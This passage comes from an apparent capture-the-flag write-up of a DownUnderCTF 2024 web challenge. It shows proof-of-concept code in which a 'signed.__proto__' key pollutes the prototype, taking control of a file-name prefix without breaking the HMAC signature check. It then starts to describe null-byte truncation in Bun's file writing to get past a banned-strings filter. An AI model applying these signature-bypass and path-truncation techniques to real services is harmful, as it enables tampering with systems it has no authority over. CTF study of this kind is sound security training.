    <span class="n">maxSize</span><span class="p">:</span> <span class="mi">50</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="o">//</span> <span class="mi">50</span><span class="n">kb</span> <span class="n">limit</span>
  <span class="p">}),</span>
  <span class="n">zValidator</span><span class="p">(</span><span class="s">'json'</span><span class="p">,</span> <span class="n">requestSchema</span><span class="p">),</span>
  <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="n">const</span> <span class="n">body</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">valid</span><span class="p">(</span><span class="s">'json'</span><span class="p">);</span>
      <span class="n">const</span> <span class="n">data</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">data</span><span class="p">;</span>
      <span class="n">const</span> <span class="n">signedData</span> <span class="o">=</span> <span class="n">getSignedData</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">const</span> <span class="n">signature</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">signature</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">hasValidSignature</span><span class="p">(</span><span class="n">signedData</span><span class="p">,</span> <span class="n">signature</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">msg</span><span class="p">:</span> <span class="s">"signatures do no match!"</span> <span class="p">},</span> <span class="mi">400</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">const</span> <span class="n">outputPrefix</span> <span class="o">=</span> <span class="n">z</span><span class="p">.</span><span class="n">string</span><span class="p">().</span><span class="n">parse</span><span class="p">(</span><span class="n">signedData</span><span class="p">.</span><span class="n">outputPrefix</span> <span class="err">??</span> <span class="s">"prisoner"</span><span class="p">);</span>
      <span class="n">const</span> <span class="n">outputFile</span> <span class="o">=</span> <span class="sb">`${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">convertJsonToYaml</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">msg</span><span class="p">:</span> <span class="n">outputFile</span> <span class="p">});</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">msg</span><span class="p">:</span> <span class="s">"failed to convert JSON"</span> <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">console</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="n">error</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">msg</span><span class="p">:</span> <span class="s">"why you send me a bad request???"</span> <span class="p">},</span> <span class="mi">400</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">);</span>
</pre></table></code></div></div><ul><li>Sending with wrong signature will give this error.</ul><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-32.png" alt="alt text" data-proofer-ignore></p><ul><li>Sending with correct signature will saved the content into one <code class="language-plaintext highlighter-rouge">.yaml</code> file in <code class="language-plaintext highlighter-rouge">/app-data/yamls/</code>.</ul><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-33.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-34.png" alt="alt text" data-proofer-ignore></p><ul><li>Analyzing <code class="language-plaintext highlighter-rouge">getSignedData()</code> function, it will check any parameter that starts with prefix <code class="language-plaintext highlighter-rouge">signed.</code></ul><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">SIGNED_PREFIX</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">signed.</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">getSignedData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">:</span> <span class="nx">any</span><span class="p">):</span> <span class="nx">any</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="na">signedParams</span><span class="p">:</span> <span class="nx">any</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">param</span> <span class="k">in</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">param</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">))</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">keyName</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
      <span class="nx">signedParams</span><span class="p">[</span><span class="nx">keyName</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="nx">param</span><span class="p">];</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">signedParams</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// Examples</span>
<span class="c1">// Input : "signed.name":"somevalue"</span>
<span class="c1">// Process : signedParams["name"] = data["signed.name"]</span>
</pre></table></code></div></div><ul><li>Analyzing <code class="language-plaintext highlighter-rouge">getSignature()</code> and <code class="language-plaintext highlighter-rouge">hasValidSignature()</code> function it will loop our object and create a <code class="language-plaintext highlighter-rouge">signature</code> based on the <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">value</code>.<li>It will then compare the <code class="language-plaintext highlighter-rouge">signature</code> calculated and the signature we give in the request.</ul><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">getSignature</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">:</span> <span class="nx">any</span><span class="p">):</span> <span class="nx">string</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">toSignArray</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="s2">`</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">=</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
  <span class="nx">toSignArray</span><span class="p">.</span><span class="nx">sort</span><span class="p">();</span>
  <span class="k">return</span> <span class="nx">createHmac</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">toSignArray</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">))</span>
    <span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">hasValidSignature</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="nx">signature</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">boolean</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">signedInput</span> <span class="o">=</span> <span class="nx">getSignature</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">signedInput</span> <span class="o">===</span> <span class="nx">signature</span>
<span class="p">};</span>
</pre></table></code></div></div><p><strong>A. Bypass The Signature with Prototype Pollution</strong></p><p>The next interesting variable is <code class="language-plaintext highlighter-rouge">outputPrefix</code>, as it could change the filename if we can control it. But, how can we alter our JSON <code class="language-plaintext highlighter-rouge">signed</code> body without affect the <code class="language-plaintext highlighter-rouge">signature</code> value? The following code is to verify if we could use <code class="language-plaintext highlighter-rouge">prototype pollution</code> to change the value of <code class="language-plaintext highlighter-rouge">outputPrefix</code></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">signed.name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">jeff</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.animalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">emu</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.age</span><span class="dl">"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.crime</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">assault</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">clotheslined someone with their neck</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.start</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2024-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.release</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2054-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.__proto__</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">outputPrefix</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">hijack</span><span class="dl">"</span><span class="p">}},</span><span class="dl">"</span><span class="s2">signature</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13</span><span class="dl">"</span>
<span class="p">};</span>
<span class="kd">const</span> <span class="nx">SIGNED_PREFIX</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">signed.</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">getSignedData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">signedParams</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">param</span> <span class="k">in</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">param</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">))</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">keyName</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
      <span class="nx">signedParams</span><span class="p">[</span><span class="nx">keyName</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="nx">param</span><span class="p">];</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">signedParams</span><span class="p">;</span>
<span class="p">};</span>
<span class="kd">const</span> <span class="nx">signedData</span> <span class="o">=</span> <span class="nx">getSignedData</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">signedData</span><span class="p">.</span><span class="nx">outputPrefix</span><span class="p">);</span>
<span class="c1">// Output : hijack</span>
</pre></table></code></div></div><p>From the above code, we can conclude it’s possible to use <code class="language-plaintext highlighter-rouge">prototype pollution</code> and change the value of <code class="language-plaintext highlighter-rouge">outputPrefix</code>. But we have another item to confirm, would the following code from <code class="language-plaintext highlighter-rouge">getSignature()</code> will be an issue for us by adding a new <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">value</code>?</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="nx">createHmac</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">).</span><span class="nx">createHmac</span><span class="p">;</span>
<span class="nx">randomBytes</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">).</span><span class="nx">randomBytes</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">SECRET_KEY</span> <span class="o">=</span> <span class="nx">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">SIGNED_PREFIX</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">signed.</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">getSignedData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">signedParams</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">param</span> <span class="k">in</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">param</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">))</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">keyName</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">SIGNED_PREFIX</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
      <span class="nx">signedParams</span><span class="p">[</span><span class="nx">keyName</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="nx">param</span><span class="p">];</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">signedParams</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// Original</span>
<span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">signed.name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">jeff</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.animalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">emu</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.age</span><span class="dl">"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.crime</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">assault</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">clotheslined someone with their neck</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.start</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2024-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.release</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2054-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">}</span>
<span class="p">};</span>
<span class="kd">const</span> <span class="nx">signedData</span> <span class="o">=</span> <span class="nx">getSignedData</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">toSignArray</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">signedData</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="s2">`</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">=</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">toSignArray</span><span class="p">.</span><span class="nx">sort</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">createHmac</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">toSignArray</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">));</span>

<span class="c1">// With Protoype Pollution "outputPrefix"</span>
<span class="kd">const</span> <span class="nx">body2</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">signed.name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">jeff</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.animalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">emu</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.age</span><span class="dl">"</span><span class="p">:</span><span class="mi">12</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.crime</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">assault</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">clotheslined someone with their neck</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.start</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2024-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.release</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2054-03-02T10:45:01Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">signed.__proto__</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">outputPrefix</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">hijack</span><span class="dl">"</span><span class="p">}},</span><span class="dl">"</span><span class="s2">signature</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13</span><span class="dl">"</span>
<span class="p">};</span>
<span class="kd">const</span> <span class="nx">signedData2</span> <span class="o">=</span> <span class="nx">getSignedData</span><span class="p">(</span><span class="nx">body2</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">toSignArray2</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">signedData2</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="s2">`</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">=</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">toSignArray2</span><span class="p">.</span><span class="nx">sort</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">createHmac</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">toSignArray2</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">));</span>

<span class="c1">//└─$ node poc.js</span>
<span class="c1">//342708064e49c23df698fae8b1189c620f87bab1beadcc441edbc289f47f46d3</span>
<span class="c1">//342708064e49c23df698fae8b1189c620f87bab1beadcc441edbc289f47f46d3</span>
</pre></table></code></div></div><p>It seems like <code class="language-plaintext highlighter-rouge">Object.entries()</code> wont affect our signature with <code class="language-plaintext highlighter-rouge">__proto__</code> added. I got no idea but asking <strong>ChatGPT</strong> actually give me new information (Unsure about the fact).</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">__proto__</span> <span class="n">itself</span> <span class="k">is</span> <span class="n">not</span> <span class="n">enumerable</span><span class="p">,</span> <span class="n">so</span> <span class="n">it</span> <span class="n">won</span><span class="err">'</span><span class="n">t</span> <span class="n">be</span> <span class="n">included</span> <span class="k">in</span> <span class="n">the</span> <span class="n">iteration</span> <span class="n">regardless</span> <span class="n">of</span> <span class="n">the</span> <span class="n">method</span> <span class="n">used</span><span class="p">.</span>
</pre></table></code></div></div><p>Reading the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries">Object.entries()</a> documentation also make sense.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-35.png" alt="alt text" data-proofer-ignore></p><p><strong>B. Truncation issue with Null Byte in Bun</strong></p><p>Since we can modify the value of <code class="language-plaintext highlighter-rouge">outputPrefix</code>, the next step is to understand how the file will be written. From the code below, the file will be written using <code class="language-plaintext highlighter-rouge">Bun</code>.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="c1">// Important Variable</span>
<span class="kd">const</span> <span class="nx">OUTPUT_YAML_FOLDER</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/app-data/yamls</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">BANNED_STRINGS</span> <span class="o">=</span> <span class="p">[</span>
  <span class="dl">"</span><span class="s2">app</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.ts</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">node</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">package</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">bun</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">home</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">etc</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">usr</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">opt</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">tmp</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">index</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.sh</span><span class="dl">"</span>
<span class="p">];</span>

<span class="c1">// Function checkIfContainsBannedString()</span>
<span class="kd">const</span> <span class="nx">checkIfContainsBannedString</span> <span class="o">=</span> <span class="p">(</span><span class="nx">outputFile</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">boolean</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">banned</span> <span class="k">of</span> <span class="nx">BANNED_STRINGS</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">outputFile</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">banned</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Function convertJsonToYaml()</span>
<span class="kd">const</span> <span class="nx">convertJsonToYaml</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="nx">outputFileString</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">boolean</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">checkIfContainsBannedString</span><span class="p">(</span><span class="nx">outputFileString</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span>
  <span class="p">}</span>
  <span class="kd">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">OUTPUT_YAML_FOLDER</span><span class="p">}</span><span class="s2">/</span><span class="p">${</span><span class="nx">outputFileString</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
  <span class="kd">const</span> <span class="nx">outputFile</span> <span class="o">=</span> <span class="nx">Bun</span><span class="p">.</span><span class="nx">file</span><span class="p">(</span><span class="nx">filePath</span><span class="p">);</span>
  <span class="c1">// Prevent accidental overwriting of app files</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">outputFile</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span>
  <span class="p">}</span>

  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">yamlData</span> <span class="o">=</span> <span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
    <span class="nx">Bun</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">outputFile</span><span class="p">,</span> <span class="nx">yamlData</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">outputFile</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">outputPrefix</span><span class="p">}</span><span class="s2">-</span><span class="p">${</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">)}</span><span class="s2">.yaml`</span><span class="p">;</span>
